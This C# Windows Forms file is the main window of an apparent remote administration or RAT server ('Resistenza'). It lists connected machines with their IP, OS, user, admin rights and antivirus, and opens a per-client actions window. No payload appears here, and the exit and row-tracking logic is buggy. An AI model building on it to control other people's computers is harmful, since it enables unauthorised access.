using Resistenza.Server.Forms;
using Resistenza.Server.Networking;

using Resistenza.Common.Packets;
using Microsoft.CodeAnalysis.CSharp.Syntax;

using Resistenza.Server.Utilities;
using System.Diagnostics;
using Microsoft.VisualBasic.Logging;
using System.Runtime.InteropServices;
using System.Windows.Forms;

using Resistenza.Server.Config;
using Microsoft.Toolkit.Uwp.Notifications;
using System.Windows;

namespace Resistenza.Server
{
    public partial class FrmMain : Form
    {

        private SocketServer ServerInstance = SocketServer.GetInstance(); //singleton
        private FrmSettings SettingsForm = new FrmSettings();
        private int ConnectedClients;
        private int LastRowNumber;
        public bool IsSettingsOpen;

        private Dictionary<ConnectedClient, int> RowsClients = new Dictionary<ConnectedClient, int>();
        public FrmMain()
        {
            InitializeComponent();

            this.Icon = Properties.Resources.resistenza_purple_logo;

            Task.Run(() => SocketServer.GetInstance().Initialize()); //.Initialize() fa da costruttore, deve gestire operazioni asincrone, quindi anch'esso dev'essere async
            ServerInstance.ServerStatusHasChanged += this.ChangeServerStatusIcon;
            ServerInstance.NewClientHasConnected += this.AddNewClient;
            SettingsForm.SettingsOpened += (object Sender, EventArgs e) => { IsSettingsOpen = true; };
            SettingsForm.SettingsClosed += (object Sender, EventArgs e) => { IsSettingsOpen = false; };
            ConnectedClients = 0;
            LastRowNumber = 0;

            PaddingPanel.Left = (BackgroundGridpanel.Width - PaddingPanel.Width) / 2;
            PaddingPanel.Top = (BackgroundGridpanel.ClientSize.Height - PaddingPanel.Height) / 2;

            this.Padding = new Padding(2);
            this.BackColor = Color.FromArgb(51, 20, 98);

            foreach (DataGridViewColumn column in clientsGrid.Columns)
            {
                column.SortMode = DataGridViewColumnSortMode.NotSortable; // Impedisce il clic sul header per ordinare
                column.Selected = false; // Impedisce la selezione dell'header
            }

            clientsGrid.ColumnHeadersDefaultCellStyle.SelectionBackColor = clientsGrid.BackgroundColor;

  
        }

        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd,
                         int Msg, int wParam, int lParam);
        [DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        private void AddNewClient(ConnectedClient newClient, ComputerInfoResponse newClientInfo)
        {
            ConnectedClients++;
            UpdateConnectedCount();
            bool FirstRowToBeAdded = false;

            if (clientsGrid.Rows.Count == 0)
            {
                clientsGrid.Rows.Add();
                FirstRowToBeAdded = true;
            }

            DataGridViewRow newRow = (DataGridViewRow)clientsGrid.Rows[0].Clone();
            newRow.Cells[1].Value = newClientInfo.ipAddress;
            newRow.Cells[2].Value = newClientInfo.operatingSystem;
            newRow.Cells[3].Value = $"{newClientInfo.ComputerUsername}@{newClientInfo.computerName}";
            newRow.Cells[4].Value = newClientInfo.isAdmin;
            newRow.Cells[5].Value = newClientInfo.Antivirus;
            newRow.Cells[6].Value = DateTime.Now.ToString();
            clientsGrid.Rows.Add(newRow);

            RowsClients.Add(newClient, LastRowNumber);

            if (FirstRowToBeAdded)
            {
                clientsGrid.Rows.RemoveAt(0);
            }

            if (ServerSettings.SoundNotification)
            {
                new ToastContentBuilder()
                .AddText("New client has connected to the server!")
                .AddText($"{newClientInfo.ipAddress} has connected!")
                .Show();

            }
        }

        private void UpdateConnectedCount()
        {
            ClientsCountLabel.Text = ClientsCountLabel.Text.Substring(0, ClientsCountLabel.Text.LastIndexOf(" ")) + " " + ConnectedClients.ToString();


        }

        private async void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            var ConfirmExitBtn = MessageBoxButtons.YesNo;
            var Result = MessageBox.Show("Are you sure you want to exit? The server will be stopped and all connections lost.", "Exit?", ConfirmExitBtn, MessageBoxIcon.Warning);

            if (Result == DialogResult.No)
            {
                e.Cancel = true;
            }


            await ServerInstance.StopServerAsync();


            Environment.Exit(0);



        }

        private void ChangeServerStatusIcon(ServerStatus NewServerStatus)
        {
            switch (NewServerStatus)
            {
                case ServerStatus.Running:
                    StatusLabel.Text = "online";
                    StatusLabel.ForeColor = Color.LightGreen;

                    break;

                //Server.Status.Errror??

                case ServerStatus.Stopped:

                    StatusLabel.Text = "offline";
                    StatusLabel.ForeColor = Color.DarkRed;


                    ConnectedClients = 0;
                    UpdateConnectedCount();
                    RowsClients.Clear();
                    clientsGrid.Rows.Clear();

                    break;

                case ServerStatus.Error:

                    StatusLabel.Text = "faulted";
                    StatusLabel.ForeColor = Color.Yellow;

                    break;
            }
        }



        private void OnClientDisconnection(object Sender, ConnectedClient ClientDisconnected)
        {
            if (Sender is FrmActions)
            {
                FrmActions CurrentOpenActionForm = (FrmActions)Sender;
                CurrentOpenActionForm.Close();
                CurrentOpenActionForm.Dispose();

            }

            LogEvent.Write(LogEvent.CreateLogString(LogEvent.LogLevel.Info, $"Client with ip: {ClientDisconnected.IpAddress} timed-out. Disconnected."));

            int AssociatedRowIndex = RowsClients.FirstOrDefault(x => x.Key == ClientDisconnected).Value;
            clientsGrid.Rows.RemoveAt(AssociatedRowIndex);

            LastRowNumber--;
            ConnectedClients--;
            UpdateConnectedCount();
            RowsClients.Remove(ClientDisconnected);

            ServerInstance.ConnectedClients.DisconnectOne(ClientDisconnected); //chiude la connessione in modo sicuro 



        }


        private void panel2_MouseDown(object sender, MouseEventArgs e)
        {

            if (GetForegroundWindow() != this.Handle)
            { //se la finestra principale non è in primo piano, la riportiamo in primo piano

                this.WindowState = FormWindowState.Minimized;
                this.Show();
                this.WindowState = FormWindowState.Normal;
            }

            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {
            this.Close(); //lancerà Form._OnClosing
        }

        private void LocalFilesGrid_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {

        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            if (IsSettingsOpen)
            {
                return;
            }
            SettingsForm.Show(this); //apre il form delle impostazioni del server
        }

        private void clientsGrid_CellDoubleClick(object sender, DataGridViewCellEventArgs e)
        {
            if (e.RowIndex == -1)
            {
                return;
            }

            ConnectedClient associatedClient = RowsClients.FirstOrDefault(x => x.Value == e.RowIndex).Key;
            FrmActions actionForm = new FrmActions(associatedClient);
            actionForm.Show();

            actionForm.ClientConnectionDied += OnClientDisconnection;
        }

        private void TopPanel_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
            this.Show();
            this.WindowState = FormWindowState.Normal;
        }
    }
}